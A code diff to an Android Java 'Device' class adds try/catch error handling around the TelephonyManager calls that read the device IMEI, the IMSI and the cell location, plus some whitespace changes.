@@ -78,9 +78,11 @@ public class Device {
 	 */
 	public byte[] getVersion() {
 		final byte[] versionRet = ByteArray.intToByteArray(Version.VERSION);
+		
 		if (Cfg.DEBUG) {
 			Check.ensures(versionRet.length == 4, "Wrong version len"); //$NON-NLS-1$
 		}
+		
 		return versionRet;
 	}
 
@@ -108,8 +110,18 @@ public class Device {
 	 * @return the imei
 	 */
 	public String getImei() {
-		final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
+		final TelephonyManager telephonyManager;
+		
+		try {
+			telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
 				Context.TELEPHONY_SERVICE);
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getImei) Error: " + ex);
+			}
+			
+			return "";
+		}
 
 		String imei = telephonyManager.getDeviceId();
 
@@ -129,9 +141,19 @@ public class Device {
 	 * @return the imsi
 	 */
 	public String getImsi() {
-		final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
+		final TelephonyManager telephonyManager;
+		
+		try {
+			telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
 				Context.TELEPHONY_SERVICE);
-
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getImei) Error: " + ex);
+			}
+			
+			return "";
+		}
+		
 		String imsi = telephonyManager.getSubscriberId();
 
 		if (imsi == null) {
@@ -142,19 +164,29 @@ public class Device {
 	}
 
 	public static CellInfo getCellInfo() {
-
 		final android.content.res.Configuration conf = Status.getAppContext().getResources().getConfiguration();
-		final TelephonyManager tm = (TelephonyManager) Status.getAppContext().getSystemService(
-				Context.TELEPHONY_SERVICE);
+		final TelephonyManager tm;
 
 		final CellInfo info = new CellInfo();
 
+		try {
+			tm = (TelephonyManager) Status.getAppContext().getSystemService(
+				Context.TELEPHONY_SERVICE);
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getImei) Error: " + ex);
+			}
+			
+			return info;
+		}
+		
 		final CellLocation bcell = tm.getCellLocation();
-
+		
 		if (bcell == null) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + Messages.getString("31_6") + Messages.getString("31_7")); //$NON-NLS-1$ //$NON-NLS-2$
 			}
+			
 			return info;
 		}
 
